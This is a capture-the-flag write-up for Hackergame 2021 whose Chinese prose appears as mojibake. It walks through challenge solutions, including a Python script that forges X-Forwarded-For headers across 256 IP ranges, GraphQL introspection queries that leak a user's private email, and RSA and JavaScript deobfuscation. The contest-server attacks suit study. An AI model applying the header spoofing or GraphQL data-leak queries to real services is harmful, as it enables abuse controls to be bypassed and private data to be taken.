# Hackergame2021 writeup by Kobe972
## ç­¾åˆ°
åœ¨ç•Œé¢ç‚¹Nextæˆ–Prevoiusï¼Œå¯ä»¥çœ‹åˆ°æµè§ˆå™¨URLå¤šäº†æŸ¥è¯¢å‚æ•°?page=xxxï¼Œå…¶ä¸­xxxä¸ºç‚¹å‡»Nextçš„æ¬¡æ•°ã€‚ç›´æ¥æ”¹å˜æµè§ˆå™¨ä¸­çš„æŸ¥è¯¢å‚æ•°ï¼Œå½“
è°ƒåˆ°1635000000æ—¶æ­£å¥½æ˜¾ç¤ºæ¯”èµ›æ—¶é—´ã€‚  
![](img/flagæ—¥è®°.PNG)
## è¿›åˆ¶åå…­â€”â€”å‚ä¸Š
æ‰“å¼€é¢˜ç›®ï¼Œå‘ç°æœ‰å¦‚ä¸‹æ‰€ç¤ºçš„å›¾ç‰‡ï¼š
![](img/è¿›åˆ¶åå…­â€”â€”å‚ä¸Š.png)
æ ¹æ®ç»éªŒæˆ–è€…åé¢çš„è‹±æ–‡è§£é‡Šï¼Œå¯ä»¥çœ‹å‡ºå·¦ä¾§å®é™…ä¸ºå³ä¾§çš„åå…­è¿›åˆ¶ASCIIç¼–ç ã€‚è§£ç å³å¯ã€‚
## å»å§ï¼è¿½å¯»è‡ªç”±çš„ç”µæ³¢
æ‰“å¼€é¢˜ç›®é™„ä»¶ï¼Œå¯ä»¥å¬å‡ºè¿™æ˜¯è¢«åŠ é€Ÿè¿‡çš„éŸ³é¢‘ï¼Œå¯ä»¥ä½¿ç”¨WavePadå°†å…¶å‡é€Ÿã€‚æ³¨æ„ï¼Œä¸ºäº†ä½¿å‡é€Ÿåçš„å½•éŸ³ä¿æŒæ¸…æ™°ï¼Œéœ€è¦å¯¹Pitchå’ŒSpeedåŒæ—¶è°ƒæ•´ã€‚  
![](img/wavepad.png)
å¬å‡ºçš„å•è¯ä¸ºï¼šfoxtrot lina alpha golf leftbracket papper hotel oscar november echo tangle india charlle alpha bravo rightbracketï¼Œä¸éœ€è¦å®Œå…¨å¬æ‡‚ï¼Œæ³¨æ„è¯†åˆ«leftbracketå’Œrightbracketï¼Œå®ƒä»¬åˆ†åˆ«ä¸ºflagçš„å·¦æ‹¬å·å’Œå³æ‹¬å·ï¼Œå…¶ä½™å­—æ¯å³ä¸ºå„å•è¯çš„é¦–å­—æ¯ã€‚  
flag{phoneticab}
## çŒ«å’ªé—®ç­”Pro Max
ç¬¬ä¸€é—®ï¼Œçœ‹çœ‹ä¹‹å‰çš„ä¿¡æ¯å®‰å…¨ä¿±ä¹éƒ¨ä¹Ÿæ²¡æœ‰ç•™ä¸‹ä»€ä¹ˆç—•è¿¹ï¼Œå¯ä»¥ä»æ—©äº›å¹´ä¸¾åŠçš„HackerGameå…¥æ‰‹ã€‚é¦–å…ˆåœ¨UstcLugçš„Wiki https://lug.ustc.edu.cn/wiki/ ä¸Šæ‰¾åˆ°ä¿¡æ¯å®‰å…¨å¤§èµ›ï¼Œå¯ä»¥çœ‹åˆ°æœ‰æ—©å¹´çš„æ¯”èµ›é“¾æ¥ã€‚ç‚¹è¿›å»å‘ç°æ­£å¥½æ˜¯SEC@USTCçš„ç½‘ç«™ï¼Œç‚¹å‡»é¦–é¡µï¼Œåˆ°https://web.archive.org/web/20181003202552/http://sec.ustc.edu.cn/doku.php/start ï¼Œå³å¯çœ‹åˆ°ä¿¡æ¯å®‰å…¨ä¿±ä¹éƒ¨ç¤¾å›¢ç« ç¨‹ï¼Œæ—¶é—´ä¸º2015å¹´5æœˆ4æ—¥ã€‚  
![](img/ç¤¾å›¢ç« ç¨‹.PNG)  
ç¬¬äºŒé—®ï¼Œåœ¨lugå®˜ç½‘ä¸Šå¯ä»¥çœ‹åˆ°æœ‰4æ¬¡ï¼Œä½†æ˜¯æœ€åç­”æ¡ˆä¸å¯¹ï¼Œäºæ˜¯è¿›è¡Œçˆ†ç ´ï¼Œå¾—åˆ°ç»“æœä¸º5æ¬¡ï¼Œæœ€åä¸€æ¬¡æ˜¯2021å¹´çš„ã€‚  
ç¬¬ä¸‰é—®ï¼Œç›´æ¥å»å›¾ä¹¦é¦†çœ‹äº†ï¼Œï¼Œç­”æ¡ˆæ˜¯Development Team of Libraryï¼Œé¢„æœŸè§£æ³•å¯ä»¥åœ¨å®˜æ–¹wpä¸Šæ‰¾åˆ°ã€‚  
ç¬¬å››é—®ï¼Œè°·æ­Œä¸ŠæœSIGBOVIK 2021ï¼Œå¹¶ä¸‹è½½è¿™ä¸€å¹´çš„æ‚å¿—ï¼Œæ‰¾åˆ°æœ‰å…³Newcomb-Benfordçš„æ–‡ç« ï¼Œå¯ä»¥çœ‹åˆ°ä½¿ç”¨äº†13ä¸ªæ•°æ®é›†ã€‚  
ç¬¬äº”é—®ï¼ŒæœProtocol Policeï¼Œå¾—çŸ¥è¿™å…¶å®æ˜¯ä¸€ä¸ªæ¶ä½œå‰§ï¼ŒæŸ¥çœ‹æ–‡æ¡£çŸ¥é“ä¸¾æŠ¥åœ°å€æ˜¯/dev/nullï¼ˆè¿™æ˜¯ä¸€ä¸ªæ–‡ä»¶çš„é»‘æ´ï¼‰ã€‚  
å½“æ—¶æäº¤ä¸Šå»å‘ç°ç­”æ¡ˆé”™è¯¯ï¼Œäºæ˜¯é€‰æ‹©å®¹æ˜“æšä¸¾çš„å‡ ä¸ªé—®é¢˜è¿›è¡Œçˆ†ç ´ã€‚
```python
import requests
session=requests.Session()
session.get('http://202.38.93.111:10001/?token=32%3AMEUCIQCWT0bKNCoPHAJ9AKui%2Ff2MfjD527ID6dYCi66KnNzyGwIgW9pIE%2B7W7rAvejSR%2FVgsY%2FIA%2F2zkehaV1QW4rmsq0dw%3D')
data={
    'q1':'20150504',
    'q3':'Development Team of Library',
    'q5':'/dev/null'
    }
for q2 in range(0,6):
    for q4 in range(1,30):
        data['q2']=str(q2)
        data['q4']=str(q4)
        if('æ²¡æœ‰å…¨éƒ¨' not in session.post('http://202.38.93.111:10001/',data=data).text):
            print('Captured!')
            print(q2)
            print(q4)
```
æœ€ç»ˆå‘ç°ç¬¬äºŒé¢˜ç­”æ¡ˆåº”è¯¥æ˜¯5è€Œä¸æ˜¯4ã€‚  
flag{8804d9f3_e509bab597}
## å–ç“œ
ç”±é¢˜ç›®çŸ¥é“ç›´æ¥ç§°20æ–¤ç“œæ˜¯ä¸å¯èƒ½çš„ã€‚æ›¾å°è¯•ç»™è¾“å…¥æˆ–è€…è¡¨å•ä¿¡æ¯èµ‹å€¼ä¸ºæµ®ç‚¹æ•°ï¼Œæˆ–è€…æŠŠpostè¡¨å•çš„b6æ”¹æˆb1ï¼Œéƒ½æ²¡æˆåŠŸã€‚å°è¯•æº¢å‡ºã€‚å¯ä»¥å‘ç°å°†ç“œçš„æ•°é‡è¾“æˆä¸€ä¸ªéå¸¸é«˜çš„å€¼æ—¶ä¼šæº¢å‡ºï¼Œäºæ˜¯æœ¬é¢˜æ€è·¯æ˜¯é€šè¿‡æº¢å‡ºæ”¹å˜ç“œçš„é‡é‡æ¨¡3çš„ä½™æ•°ã€‚  
å°è¯•ä¸€ä¸‹å¯ä»¥çŸ¥é“ï¼Œå½“6æ–¤çš„ç“œ1e18ä¸ªï¼Œ9æ–¤çš„ç“œ1e17ä¸ªæ—¶ä¼šå‘ç”Ÿæº¢å‡ºï¼Œæˆ‘ä»¬æœŸæœ›æœ€åä¼šå‡ºç°-1ä¸ªç“œï¼Œè¿™æ ·-1+6+9+6=20ã€‚åªéœ€è¦è§£æ–¹ç¨‹2x+3y=1448914691236517205ï¼Œå®¹æ˜“å‘ç°x=yæ—¶å·¦å³å¼éƒ½è¢«5æ•´é™¤ï¼Œç»§ç»­åŒ–ç®€å³å¯æ±‚å‡ºxå’Œyã€‚  
flag{HUAQIANG!HUAQIANG!_8bac858c88}
## é€æ˜çš„æ–‡ä»¶
ä»”ç»†è¯»é¢˜ï¼Œæœç´¢â€œç»ˆç«¯ äº”é¢œå…­è‰²â€ï¼Œå¯ä»¥å‘ç°æ–‡ä»¶æ˜¯ANSIè½¬ä¹‰åºåˆ—ã€‚win10çš„cmdå¯èƒ½ä¸æ”¯æŒè¿è¡Œï¼Œéœ€è¦åˆ°githubä¸Šä¸‹è½½ansiç›¸å…³æ’ä»¶ï¼ˆå¦‚ansiconï¼‰ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œå¯ä»¥å‘ç°ä¸‹è½½çš„æ–‡ä»¶å°‘äº†^[è½¬ä¹‰åºåˆ—ï¼Œéœ€è¦è¡¥ä¸Šã€‚æ³¨æ„cmdé‡Œ^[çš„æ‰“æ³•æ˜¯ctrl+[ï¼Œè€Œä¸æ˜¯ç›´æ¥æ‰“è¿™ä¸¤ä¸ªå­—ç¬¦ã€‚ä¸ºæ–¹ä¾¿èµ·è§ï¼Œç¼–å†™.cppæ–‡ä»¶è¿›è¡Œè½¬ä¹‰å­—ç¬¦çš„è¾“å‡ºï¼Œå†ç”¨ansiconæ‰“å¼€ã€‚
```cpp
#include<iostream>
using namespace std;
int main()
{
	cout << "\033[0;0H\033[20;58H\033[8;34H\033[13;27H\033[4;2H\033[38;2;1;204;177m0\033[39m\033[14;10H\033[20;51H\033[23;"; //åé¢çš„çœå»äº†
	return 0;
 } 
 ```
æ‰§è¡Œæ•ˆæœï¼š  
![](img/transparent.PNG)
flag{abxnniohkalmcowsayfiglet}
## æ—…è¡Œç…§ç‰‡
å…³é”®ç‚¹æ˜¯åœ¨ç½‘ä¸Šæœè“è‰²æ²¿æµ·KFCï¼Œå¾—çŸ¥è¿™æ˜¯ç§¦çš‡å²›çš„ä¸€å¤„ç»å…¸ï¼Œæ—è¾¹æ˜¯æµ·è±šé¦†ï¼Œç”µè¯å¯ä»¥åœ¨ç¾å›¢æœåˆ°ï¼ˆä¸è¦æ‰“é¢˜ç›®è¾“å…¥æ¡†é‡Œçš„ç¤ºä¾‹ç”µè¯ï¼Œè¿™æ˜¯ç§‘å¤§ä¿å«å¤„ï¼ï¼ï¼æœ¬äººå·®ç‚¹å°±æ‰“äº†ï¼‰ã€‚æ¥¼å±‚é«˜åº¦ç”±æµ·å¹³é¢åˆ¤æ–­å‡ºï¼Œä¸º14å±‚ï¼›æ³¨æ„å‰é¢æ¥¼æˆ¿çš„å¤ªé˜³èƒ½ç”µæ± ï¼Œä¸€èˆ¬ä¼šæœå—ï¼Œå› æ­¤æ‹æ‘„æ–¹å‘æ˜¯ä¸œå—ã€‚æ‹æ‘„æ—¶é—´ç¡®å®ä¸å¥½æ‰¾ï¼Œä½†å¯ä»¥ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œç­”æ¡ˆæ˜¯å‚æ™šã€‚  
## FLAGåŠ©åŠ›å¤§çº¢åŒ…
é¦–å…ˆï¼Œç‚¹ä¸¤æ¬¡åŠ©åŠ›ä¼šæç¤ºé‡å¤çš„/8åœ°å€ï¼Œè¯´æ˜IPéœ€è¦å‰ä¸‰ä½ä¸åŒã€‚ä¸€å¼€å§‹è¯•ç€ä¿®æ”¹postè¡¨å•çš„IPï¼Œå‘ç°ä¼šå› ä¸ºå‰åç«¯IPä¸åŒè¢«æ£€æµ‹å‡ºã€‚ç„¶åç”¨Burpsuiteæ’ä»¶ä¼ªé€ IPåœ°å€ï¼Œè™½ç„¶æ²¡æˆåŠŸï¼Œä½†æ˜¯å‘ç°æ¯æ¬¡åç«¯IPä¼šå˜æˆéšæœºä¸€ä¸ªæ•°ã€‚ç”¨WiresharkæŠ“åŒ…å¹¶æœç´¢æ£€æµ‹å‡ºçš„åç«¯IPï¼Œå‘ç°åœ¨ä¸€ä¸ªx-forwarded-forçš„é”®é‡Œé¢ï¼ˆæ’ä»¶ä¹Ÿä¿®æ”¹äº†è¿™ä¸ªé”®ï¼Œä½†æ˜¯ä¸çŸ¥é“ä¸ºä»€ä¹ˆburpsuiteå‘é€æ•°æ®åŒ…å‰åˆè‡ªå·±ä¿®æ”¹äº†ä¸€éï¼‰ã€‚äºæ˜¯æœ¬é¢˜çš„è§£å†³åŠæ³•æ˜¯ä½¿ç”¨pythonå‘é€åŒ…å«ä¼ªé€ IPçš„postè¯·æ±‚åŒ…ç»™æœåŠ¡å™¨ã€‚è§£é¢˜è„šæœ¬ï¼š
```python
import requests
import time

def start(url):
    for i in range(0,256):
        ip=str(i)+'.114.5.14'
        headers={
            'Host':'202.38.93.111:10888',
            'X-Forwarded-For':ip,
            'Origin':'http://202.38.93.111:10888',
        }
        data={
            'ip':ip
        }
        if 'æˆåŠŸ' not in requests.post(url,headers=headers,data=data).text:
            print(ip,'å¤±è´¥')
        time.sleep(1)
start('http://202.38.93.111:10888/invite/bc78d4f2-a3bd-45ca-ae6e-03c04d4f14be')
```
è¿™é“é¢˜ä½¿ç”¨ä»£ç†æ± æ˜¯æ²¡ç”¨çš„ï¼Œéœ€è¦ç”¨å®Œ256ä¸ª/8åœ°å€æ‰èƒ½å®ŒæˆåŠ©åŠ›ï¼Œä»£ç†æ± åšä¸åˆ°è¿™ä¸€ç‚¹ã€‚
## Amnesia--è½»åº¦å¤±å¿†
.dataæ®µå­˜æ”¾çš„æ˜¯åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ï¼Œ.rodataæ®µå­˜æ”¾çš„æ˜¯å¸¸é‡ã€‚åªè¦ä¸æŠŠå«Hello Worldçš„å­—æ®µå­˜ä¸ºè¿™ä¸¤ç§ç±»å‹å³å¯ã€‚ä¸€ç§æ–¹æ³•æ˜¯ä½¿ç”¨putcharè¿›è¡Œè¾“å‡ºï¼Œä¾æ¬¡è¾“å‡ºæ¯ä¸ªå­—ç¬¦ã€‚
## å›¾ä¹‹ä¸Šçš„ä¿¡æ¯
æœ¬é¢˜è€ƒæŸ¥çš„æ˜¯GraphQLå®¹æ˜“æ³„éœ²æ•æ„Ÿä¿¡æ¯çš„æ¼æ´ï¼Œåœ¨è°·æ­Œæœâ€œGrapgQL vulnerabilityâ€åå¾—çŸ¥GraphQLå­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œç™¾åº¦æœâ€œGraphQL ä¿¡æ¯æ³„éœ²â€å¤§æ¦‚çŸ¥é“æ€ä¹ˆè·å–æ•æ„Ÿä¿¡æ¯äº†ã€‚  
å…·ä½“ç­–ç•¥ï¼š  
ç¬¬ä¸€æ­¥ï¼Œæœç´¢å¯æŸ¥è¯¢å‚æ•°ã€‚
```
http://202.38.93.111:15001/graphql?query={__schema{types{name,fields{name}}}}
```
ç»“æœï¼š
```
{"data":{"__schema":{"types":[{"name":"Query","fields":[{"name":"note"},{"name":"notes"},{"name":"user"}]},{"name":"GNote","fields":[{"name":"id"},{"name":"contents"}]},{"name":"Int","fields":null},{"name":"String","fields":null},{"name":"GUser","fields":[{"name":"id"},{"name":"username"},{"name":"privateEmail"}]},{"name":"Boolean","fields":null},{"name":"__Schema","fields":[{"name":"description"},{"name":"types"},{"name":"queryType"},{"name":"mutationType"},{"name":"subscriptionType"},{"name":"directives"}]},{"name":"__Type","fields":[{"name":"kind"},{"name":"name"},{"name":"description"},{"name":"specifiedByUrl"},{"name":"fields"},{"name":"interfaces"},{"name":"possibleTypes"},{"name":"enumValues"},{"name":"inputFields"},{"name":"ofType"}]},{"name":"__TypeKind","fields":null},{"name":"__Field","fields":[{"name":"name"},{"name":"description"},{"name":"args"},{"name":"type"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__InputValue","fields":[{"name":"name"},{"name":"description"},{"name":"type"},{"name":"defaultValue"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__EnumValue","fields":[{"name":"name"},{"name":"description"},{"name":"isDeprecated"},{"name":"deprecationReason"}]},{"name":"__Directive","fields":[{"name":"name"},{"name":"description"},{"name":"isRepeatable"},{"name":"locations"},{"name":"args"}]},{"name":"__DirectiveLocation","fields":null}]}}}
```
å¯ä»¥çœ‹å‡ºprivateEmailæ˜¯æˆ‘ä»¬æƒ³è¦çš„ä¿¡æ¯ã€‚  
ç¬¬äºŒæ­¥ï¼ŒæŸ¥è¯¢ç®¡ç†å‘˜çš„idï¼ˆä¸å…è®¸é€šè¿‡usernameç›´æ¥æŸ¥è¯¢privateEmailï¼‰
```
http://202.38.93.111:15001/graphql?query={user(id:1){name}}
```
å¾—åˆ°admin  
ç¬¬ä¸‰æ­¥ï¼ŒæŸ¥è¯¢é‚®ç®±
```
http://202.38.93.111:15001/graphql?query={user(id:1){privateEmail}}
```
ç»“æœï¼š
```
å¾—åˆ°{"data":{"user":{"privateEmail":"flag{dont_let_graphql_l3ak_data_ead3f64cd6@hackergame.ustc}"}}}
```
fla{dont_let_graphql_l3ak_data_ead3f64cd6@hackergame.ustc}
## Easy RSA
æœ¬é¢˜å…³é”®ç‚¹æ˜¯è·å–pä»¥åŠé€†å‘è·å–qï¼Œæ ¹æ®æºä»£ç æç¤ºï¼Œè¦åˆ©ç”¨ç”Ÿæˆpçš„xå’Œyç›¸å·®è¾ƒå°çš„æ€§è´¨ã€‚è¿›è¡Œå¦‚ä¸‹æ¨å¯¼ï¼š
![](img/EasyRSA.jpg)
è§£é¢˜è„šæœ¬ï¼š
```python
import math
import sympy
from Crypto.Util.number import *

e = 65537


def get_p():
    x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451
    y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439
    value_p = sympy.nextprime(pow(math.factorial(x-y-1),x-2,x))
    return value_p


def get_q():
    value = [0,0,0,0,0,0,0,0,0,0]
    value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967
    for i in [8,7,6,5,4,3,2,1,0]:
        value[i]=sympy.prevprime(value[i + 1])
    phi=1
    for i in range(0,10):
        phi*=value[i]-1
    d=inverse(e,phi)%phi
    n = 1
    for i in range(10):
        n = n * value[i]
    value_q=5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819
    q = pow(value_q,d,n)
    return sympy.nextprime(q)

p=get_p()
q = get_q()

c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478
d=inverse(e,(p-1)*(q-1))%((p-1)*(q-1))
m=pow(c,d,p*q)
m=m.to_bytes(28,'big')
m=str(m,encoding='utf-8')
print(m)
```
## èµ›åšå¨æˆ¿å‰ä¸¤é—®
å±äºæ°´é¢˜ï¼Œç›´æ¥è´´ç­”æ¡ˆï¼š
```
level1:
0ï¼Œ0
å‘å³ 1 æ­¥
æ‹¿èµ· 1 ä¸ªç‰©å“
å‘ä¸‹ 1 æ­¥
å‘å·¦ 1 æ­¥
æ”¾ä¸‹ 1 ä¸ªç‰©å“
å‘å³ 1 æ­¥
å‘ä¸Š 1 æ­¥
æ‹¿èµ· 1 ä¸ªç‰©å“
å‘ä¸‹ 1 æ­¥
å‘å·¦ 1 æ­¥
æ”¾ä¸‹ 1 ä¸ªç‰©å“

0ï¼Œ1
å‘å³ 1 æ­¥
æ‹¿èµ· 1 ä¸ªç‰©å“
å‘ä¸‹ 1 æ­¥
å‘å·¦ 1 æ­¥
æ”¾ä¸‹ 1 ä¸ªç‰©å“
å‘å³ 2 æ­¥
å‘ä¸Š 1 æ­¥
æ‹¿èµ· 1 ä¸ªç‰©å“
å‘ä¸‹ 1 æ­¥
å‘å·¦ 2 æ­¥
æ”¾ä¸‹ 1 ä¸ªç‰©å“

1ï¼Œ0
å‘å³ 2 æ­¥
æ‹¿èµ· 1 ä¸ªç‰©å“
å‘ä¸‹ 1 æ­¥
å‘å·¦ 2 æ­¥
æ”¾ä¸‹ 1 ä¸ªç‰©å“
å‘å³ 1 æ­¥
å‘ä¸Š 1 æ­¥
æ‹¿èµ· 1 ä¸ªç‰©å“
å‘ä¸‹ 1 æ­¥
å‘å·¦ 1 æ­¥
æ”¾ä¸‹ 1 ä¸ªç‰©å“

1ï¼Œ1
å‘å³ 2 æ­¥
æ‹¿èµ· 1 ä¸ªç‰©å“
å‘ä¸‹ 1 æ­¥
å‘å·¦ 2 æ­¥
æ”¾ä¸‹ 1 ä¸ªç‰©å“
å‘å³ 2 æ­¥
å‘ä¸Š 1 æ­¥
æ‹¿èµ· 1 ä¸ªç‰©å“
å‘ä¸‹ 1 æ­¥
å‘å·¦ 2 æ­¥
æ”¾ä¸‹ 1 ä¸ªç‰©å“

level2:
å…±146ä¸ª0
ä½¿ç”¨æ¡ä»¶è¯­å¥ï¼Œæ”¾å®Œä¸ºæ­¢
```
## MineCraft
é˜…è¯»ç½‘é¡µæºç çš„è¿™ä¸€éƒ¨åˆ†ï¼š
```javascript
function printcinput(){
    let content=document.getElementById('spann');
    if (cinput[0]==='M') {
	    if (pressplateList[64].status===false){
		    pressplateList[64].TurnOn_redstone_lamp();
		    pressplateList[64].status=true;
	    }
    }   
	if(cinput.length>=32){
		let tbool=gyflagh(cinput.join(''));
		if(tbool) {
			pressplateList[65].TurnOn_redstone_lamp();
			content.innerText='Congratulations!!!';
			return;
		}
		cinput.length=0;
	}
	content.innerText=cinput.join('');
}
```
å¯ä»¥çœ‹å‡ºï¼Œå¦‚æœè¾“å…¥çš„ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯Mï¼Œåˆ™ç‚¹äº®ä¸€ç›ç¯ï¼›å¦‚æœè¾“å…¥çš„ä¸²é•¿åº¦è¾¾åˆ°32å¹¶ä¸”æ»¡è¶³gyflaghåˆ¤æ–­çš„æ¡ä»¶ï¼Œåˆ™æ¸¸æˆèƒœåˆ©ï¼Œå¦åˆ™å°†ä¸²æ¸…é›¶ã€‚  
å†çœ‹gyflagh:
```
function gyflagh(_0x111955){const _0x50051f=_0x22517d;let _0x3b790d=_0x111955[_0x50051f(0x1a8)](_0x50051f(0x1b7));if(_0x3b790d===_0x50051f(0x1aa))return!![];return![];}
```
è¿™æ˜¯è¢«æ··æ·†è¿‡çš„ä»£ç ï¼Œä¸€äº›å˜é‡è¢«ä»¥åå…­è¿›åˆ¶è¿™ç§ä¸æ˜“é˜…è¯»çš„å½¢å¼å‘½åã€‚å¯¹äºå‡½æ•°çš„ä¸´æ—¶å˜é‡ï¼Œå¯ä»¥æ›¿æ¢ä¸ºå®¹æ˜“ç†è§£çš„åå­—ï¼›å¯¹äºå…¨å±€å˜é‡ï¼Œåœ¨æµè§ˆå™¨çš„è°ƒè¯•ç•Œé¢æ±‚å®ƒçš„å®é™…å€¼ã€‚æ¯”å¦‚åœ¨æµè§ˆå™¨çš„è°ƒè¯•ç•Œé¢è¾“å…¥_0x50051f(0x1a8)ï¼Œå¯ä»¥çœ‹åˆ°encryptï¼Œç”±æ··æ·†ä»£ç åé¢çš„æ‹¬å·å¯ä»¥çœ‹å‡ºï¼Œencryptä¸ºstringçš„ä¸€ä¸ªæ–¹æ³•ï¼ŒåŒæ—¶å®ƒä¹Ÿæ˜¯ä¸€ä¸ªå‡½æ•°ã€‚å†è¾“å…¥'fff'.encryptå¯ä»¥çœ‹åˆ°å‡½æ•°æºç ï¼š
```javascript
function(_0x6a2659){const _0x13519e=_0x22517d,_0x267e12=new Array(0x2),_0x11a961=new Array(0x4);let _0x1bf548='';plaintext=escape(this);for(var _0x485827=0x0;_0x485827<0x4;_0x485827++)_0x11a961[_0x485827]=Str4ToLong(_0x6a2659[_0x13519e(0x1a6)](_0x485827*0x4,(_0x485827+0x1)*0x4));for(_0x485827=0x0;_0x485827<plaintext[_0x13519e(0x1b8)];_0x485827+=0x8){_0x267e12[0x0]=Str4ToLong(plaintext['slice'](_0x485827,_0x485827+0x4)),_0x267e12[0x1]=Str4ToLong(plaintext[_0x13519e(0x1a6)](_0x485827+0x4,_0x485827+0x8)),code(_0x267e12,_0x11a961),_0x1bf548+=LongToBase16(_0x267e12[0x0])+LongToBase16(_0x267e12[0x1]);}return _0x1bf548;}
```
ç”¨åŒæ ·çš„æ–¹æ³•ï¼Œå³å¯åæ··æ·†å¾—åˆ°åŸæ¥çš„å‡½æ•°ï¼š
```javascript
function encrypt(input) //input:'1356853149054377'
{
    const arr1=new Array(2),arr2=new Array(4);
    let result='';
    plaintext=escape(this); //æ»¡è¶³é¢„æœŸè¿”å›å€¼çš„æ¡ä»¶çš„plaintextå³ä¸ºå¯†ç 
    for(var i=0;i<4;i++)
        arr2[i]=Str4ToLong(input['slice'](i*4,(i+1)*4));
    //arr2:[909456177, 825439544, 892352820, 926364468]
    for(i=0;i<plaintext['length'];i+=8)
    {
        arr1[0]=Str4ToLong(plaintext['slice'](i,i+4));
        arr1[1]=Str4ToLong(plaintext['slice'](i+4,i+8));
        code(arr1,arr2);
        result+=LongToBase16(arr1[0])+LongToBase16(arr1[1]);
    }
    return result; //expected:'6fbde674819a59bfa12092565b4ca2a7a11dc670c678681daf4afb6704b82f0c'
//arr1=[1874716276,-2120590913],[-1591700906,1531749031],[-1591884176,-965187555],[-1354040473,79179532]
}

function code(arr1,arr2)
{
    let a=arr1[0],b=arr1[1];
    const inc=(0x52cfb2de+0x4b67c6db),bound=inc*0x20;
    let i=0;
    while(i!=bound)
    {
        a+=(b<<4^b>>>5)+b^i+arr2[i&3];
        i+=inc;
        b+=(a<<0x4^a>>>0x5)+a^i+arr2[i>>>0xb&3];
    }
    arr1[0]=a,arr1[1]=b;
}
```
å…¶ä¸­codeå°†arr1ï¼Œarr2è¿›è¡Œäº†ç¼–ç ï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°çš„æ˜¯ç¼–ç åçš„arr1å’Œarr2ï¼Œä¸ºäº†å¾—åˆ°ç¼–ç å‰çš„å€¼ï¼Œéœ€è¦å†åè¿‡æ¥å†™ä¸€ä¸ªè§£ç å‡½æ•°ï¼š
```javascript
function decode(arr1,arr2)
{
    let a=arr1[0],b=arr1[1];
    const inc=(0x52cfb2de+0x4b67c6db);
    let i=inc*0x20;
    while(i>0)
    {
        b-=(a<<0x4^a>>>0x5)+a^i+arr2[i>>>0xb&3];
        i-=inc;
        a-=(b<<4^b>>>5)+b^i+arr2[i&3];
    }
    arr1[0]=a,arr1[1]=b;
}
```
ä¸ºäº†è·å–å¯†ç ï¼Œåœ¨è°ƒè¯•çª—å£å¯¹arr1çš„æ¯ä¸€ç»„å€¼è¿›è¡Œè§£ç å¾—åˆ°å­—ç¬¦ä¸²ï¼š
```javascript
decode(arr1,arr2);
LongToStr(arr1[0]);
LongToStr(arr1[1]);
```
å°†å®ƒä»¬æ‹¼æ¥èµ·æ¥å³å¯å¾—åˆ°flagï¼š  
flag{McWebRE_inMlnCrA1t_3a5y_1cIuop9i}
## pğŸ˜­q
å°†ä¸‹è½½çš„gifè½¬å›numpyï¼Œå¹¶å°†é¢˜ç›®çš„å„ä¸ªè¿‡ç¨‹é€†ç€èµ°ä¸€éå³å¯ã€‚
```python
import numpy as np
from PIL import Image, ImageSequence
import librosa 

img = Image.open('flag.gif')
frames = np.array([np.array(frame.copy().convert('RGB').getdata(),dtype=np.uint8).reshape(frame.size[1],frame.size[0],3) for frame in ImageSequence.Iterator(img)]) #å°†æ¯ä¸€ä¸ªåƒç´ çš„RGBå€¼ç”¨ä¸­æ‹¬å·åŒ…èµ·æ¥å˜æˆä¸€ä¸ªåˆ—è¡¨
frames=frames[:,1::2,1::2] #æŒ‰å¥‡å¶æ€§éš”ç€å–ï¼Œç•¥æ‰æ²¡æœ‰æ„ä¹‰çš„ç™½è‰²é—´éš”
spectrogram=np.array([(frames[i].sum(axis=0)[1::2][:,0]-frames[i].sum(axis=0)[1::2][:,1])/255*2-60 for i in range(0,frames.shape[0])])
spectrogram=librosa.db_to_power(spectrogram.transpose())
origin=librosa.feature.inverse.mel_to_audio(spectrogram) #é€†å˜æ¢
librosa.output.write_wav('origin.wav', origin, 22050, norm=False)
```
å¾—åˆ°çš„origin.wavé‡Œæœ‰ç”¨è‹±æ–‡å¿µå‡ºæ¥çš„æ•°å­—ï¼Œè¿™å°±æ˜¯flagã€‚  
flag{634971243582}
## è¶…OIçš„Writeupæ¨¡æ‹Ÿå™¨â€”â€”ç¬¬ä¸€å…³
ç”¨IDAå°†äºŒè¿›åˆ¶æ–‡ä»¶åç¼–è¯‘ï¼Œå‘ç°ç¨‹åºçš„æµç¨‹å¦‚ä¸‹ï¼šè¾“å…¥å«16ä¸ªå­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå‰å…«å’Œåå…«ä¸ªå­—ç¬¦å½“æˆint64ç±»å‹ä¼ å…¥ä¸€ä¸ªå‡½æ•°ï¼Œå¦‚æœå‡½æ•°åˆ¤å®šæ­£ç¡®åˆ™å¯†ç æ­£ç¡®ã€‚é¦–å…ˆå°†å‡½æ•°é‡Œæ¶‰åŠè¾“å…¥å‚æ•°çš„å¤„ç†éƒ½ç”¨printfæ‰“å°å‡ºæ¥ï¼Œå¾—åˆ°æ¯”è¾ƒç®€å•çš„æ‰§è¡Œæµç¨‹ï¼Œç„¶åç”¨angræ±‚è§£ã€‚  
è§£é¢˜è„šæœ¬ï¼š
```python
import angr
proj=angr.Project('./0.bin')
state=proj.factory.entry_state()
a3=state.solver.BVS("a3",64)
a4=state.solver.BVS("a4",64)
for i in range(0,16):
